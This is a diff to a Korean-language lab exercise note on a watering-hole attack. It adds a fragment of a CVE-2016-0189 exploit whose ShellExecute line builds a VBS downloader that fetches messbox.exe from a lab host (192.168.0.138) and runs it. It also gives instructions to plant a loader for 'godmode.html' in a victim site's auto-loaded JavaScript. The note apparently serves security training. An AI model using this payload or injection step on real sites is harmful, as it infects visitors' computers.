@@ -15,11 +15,22 @@
 root 권한을 이용하여 웹 서버에 악성 스크립트 주입
 
 ---
+
+### 실습
+
 ![](Images/Pasted%20image%2020261120103046.png)
 
 
-실습
-
+아래 스크립트를 실행시키도록 만든다.
+해당 코드는 cve-2016-0189 취약점 코드를 기반으로 동작.
+```js
+105 Set Object = CreateObject("Shell.Application")  
+106 Object.ShellExecute "cmd", "/c CD %TEMP%&@echo Set objXMLHTTP=CreateOb ject(""MSXML2.XMLHTTP"")>down_exec.vbs&@echo objXMLHTTP.open ""GET"",""[http://192](http://192). 168.0.138/messbox.exe"",false>>down_exec.vbs&@echo objXMLHTTP.send()>>down_exec.vb s&@echo If objXMLHTTP.Status=200 Then>>down_exec.vbs&@echo Set objADOStream=Create Object(""ADODB.Stream"")>>down_exec.vbs&@echo objADOStream.Open>>down_exec.vbs&@ec ho objADOStream.Type=1 >>down_exec.vbs&@echo objADOStream.Write objXMLHTTP.Respons eBody>>down_exec.vbs&@echo objADOStream.Position=0 >>down_exec.vbs&@echo objADOStr eam.SaveToFile ""%TEMP%\messbox.exe"">>down_exec.vbs&@echo objADOStream.Close>>dow n_exec.vbs&@echo Set objADOStream=Nothing>>down_exec.vbs&@echo End if>>down_exec.v bs&@echo Set objXMLHTTP=Nothing>>down_exec.vbs&@echo Set objShell=CreateObject(""W Script.Shell"")>>down_exec.vbs&@echo objShell.Exec(""%TEMP%\messbox.exe"")>>down_e xec.vbs&del %TEMP%\messbox.exe&cscript.exe %TEMP%\down_exec.vbs&del %TEMP%\down_ex ec.vbs", "", "open", 0  
+107 End Function  
+108  
+109 Function triggerBug  
+110 ' Resize array we are currently indexing
+```
 
 
 피해 웹 서버 안에서 불러오고 있는 js 파일 안에 'godmode.html' 파일을 불러오는 코드 작성을 한다. 실제로 웹 페이지 실행 시 자동으로 호출되는 여러 .js 중에서 하나에 심는다.
